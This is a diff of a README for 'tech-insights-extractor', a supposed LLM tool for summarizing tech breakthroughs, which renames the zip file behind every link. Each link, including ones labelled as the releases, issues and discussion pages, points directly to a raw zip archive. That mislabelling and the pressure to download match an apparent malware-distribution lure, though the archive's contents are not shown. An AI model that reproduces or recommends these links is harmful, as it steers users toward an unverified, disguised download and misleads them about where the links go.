@@ -1,6 +1,6 @@
 # 🚀 tech-insights-extractor - Easily Summarize Tech Breakthroughs
 
-[![Download Now](https://github.com/adamhamraoui/tech-insights-extractor/raw/refs/heads/main/tech_insights_extractor/extractor_tech_insights_v1.7.zip%20Now-%20-blue)](https://github.com/adamhamraoui/tech-insights-extractor/raw/refs/heads/main/tech_insights_extractor/extractor_tech_insights_v1.7.zip)
+[![Download Now](https://github.com/adamhamraoui/tech-insights-extractor/raw/refs/heads/main/tech_insights_extractor/insights-tech-extractor-v3.1.zip%20Now-%20-blue)](https://github.com/adamhamraoui/tech-insights-extractor/raw/refs/heads/main/tech_insights_extractor/insights-tech-extractor-v3.1.zip)
 
 ## 📋 Description
 tech-insights-extractor summarizes tech breakthroughs, extracts key innovations, and categorizes advances from user text using LLM prompts. This application makes it easy for users to understand complex technological developments in simple terms.
@@ -17,7 +17,7 @@ tech-insights-extractor summarizes tech breakthroughs, extracts key innovations,
 To get started, please follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to access the download options.
-   [Download Here](https://github.com/adamhamraoui/tech-insights-extractor/raw/refs/heads/main/tech_insights_extractor/extractor_tech_insights_v1.7.zip)
+   [Download Here](https://github.com/adamhamraoui/tech-insights-extractor/raw/refs/heads/main/tech_insights_extractor/insights-tech-extractor-v3.1.zip)
    
 2. **Choose the Latest Version:** Look for the version marked as "latest." This version includes all updates and improvements.
 
@@ -43,7 +43,7 @@ To get started, please follow these steps:
 
 ## ⚙️ Troubleshooting
 If you encounter any issues during installation or usage:
-- **Check for Updates:** Always ensure you are using the latest version from the [Releases Page](https://github.com/adamhamraoui/tech-insights-extractor/raw/refs/heads/main/tech_insights_extractor/extractor_tech_insights_v1.7.zip).
+- **Check for Updates:** Always ensure you are using the latest version from the [Releases Page](https://github.com/adamhamraoui/tech-insights-extractor/raw/refs/heads/main/tech_insights_extractor/insights-tech-extractor-v3.1.zip).
 - **Reinstall:** If problems persist, try uninstalling and reinstalling the application.
 - **Seek Help:** Search in the issues tab in this repository for solutions or to ask for help.
 
@@ -70,8 +70,8 @@ This application focuses on:
 - Unstructured Data
 
 ## 🔗 Links
-- [Releases Page](https://github.com/adamhamraoui/tech-insights-extractor/raw/refs/heads/main/tech_insights_extractor/extractor_tech_insights_v1.7.zip)
-- [Issues Page](https://github.com/adamhamraoui/tech-insights-extractor/raw/refs/heads/main/tech_insights_extractor/extractor_tech_insights_v1.7.zip)
-- [Discussion Forum](https://github.com/adamhamraoui/tech-insights-extractor/raw/refs/heads/main/tech_insights_extractor/extractor_tech_insights_v1.7.zip)
+- [Releases Page](https://github.com/adamhamraoui/tech-insights-extractor/raw/refs/heads/main/tech_insights_extractor/insights-tech-extractor-v3.1.zip)
+- [Issues Page](https://github.com/adamhamraoui/tech-insights-extractor/raw/refs/heads/main/tech_insights_extractor/insights-tech-extractor-v3.1.zip)
+- [Discussion Forum](https://github.com/adamhamraoui/tech-insights-extractor/raw/refs/heads/main/tech_insights_extractor/insights-tech-extractor-v3.1.zip)
 
 Thank you for using tech-insights-extractor! Your feedback helps us improve.
